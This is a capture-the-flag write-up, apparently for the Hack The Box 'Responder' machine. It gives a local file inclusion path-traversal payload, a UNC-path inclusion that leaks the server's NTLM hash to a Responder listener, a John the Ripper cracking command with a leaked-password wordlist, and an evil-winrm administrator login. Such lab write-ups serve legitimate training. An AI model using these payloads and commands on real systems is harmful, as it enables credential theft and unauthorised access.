#  Responder

## Nmap Scan
- Used `nmap` to scan all ports.
- Found open HTTP ports: 80 and 5985.
- Found open `tcpwrapped` port (unsure what it is).
- OS detected as Windows.
- Plan: exploit WinRM (Windows Remote Management).

## Website Enumeration
- Visiting IP redirects to `http://unika.htb/`.
- Likely name-based Virtual Hosting.
- `/etc/hosts` updated to point `unika.htb` to IP.

### File Inclusion Vulnerability
- Navigating the site and changing language to French shows:
  `http://unika.htb/index.php?page=french.html`
- Potential LFI vulnerability.
- Accessed files via path traversal:
  `?page=../../../../../../../../windows/system32/drivers/etc/hosts`
- Indicates no input validation on `page` param — likely using `include()` in PHP.

## Exploiting with Responder
- Launched Responder: `sudo python3 Responder.py -I tun0`
- Triggered Responder using: `?page=//<responder-ip>/something`
- NTLM hash captured.

### Cracking the Hash
- Used John the Ripper:
  ```bash
  john -w=/Seclists/Passwords/Leaked-Databases/rockyou-75.txt ./Desktop/hash.txt
  ```
- Password retrieved.

## Getting a Shell
- Logged in with Evil-WinRM:
  ```bash
  evil-winrm -i 10.129.136.91 -u administrator -p [REDACTED]
  ```
